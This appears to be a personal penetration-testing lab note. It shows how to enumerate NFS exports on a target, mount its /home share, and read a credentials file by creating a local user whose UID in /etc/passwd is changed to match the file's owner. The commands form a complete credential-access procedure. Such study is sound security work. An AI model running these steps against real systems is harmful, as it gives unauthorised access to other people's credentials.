```bash - kali
showmount -e $TARGET
```

![[Pasted image 20221115122217.png]]
   
Notice the /home directory

```bash - kali
mkdir ./home
```

```bash - kali
sudo mount -t nfs -o nolock,nfsvers=3 $TARGET:/home ./home/
```

```bash - kali
cd ./home  && ls
```

Digging through, we see a creds file:

![[Pasted image 20221109113447.png | 600]]

Now we create a new user on kali, change it's user id value, then open the file:

```bash - kali
sudo adduser pwn
```

```bash - kali
cat /etc/passwd | grep pwn
```
   
now to change the 1002 to 1014

```bash - kali
sudo sed -i -e 's/1002/1014/g' /etc/passwd
```

```bash - kali
cat /etc/passwd | grep pwn
```
   
```bash - kali
su pwn
```

```bash - kali
cat creds.txt
```

---

```bash - kali
mount -t nfs $TARGET:/Mount/ /MyFolder -no lock
```

![[Pasted image 20220112111950.png]]

![[Pasted image 20220112112052.png]]
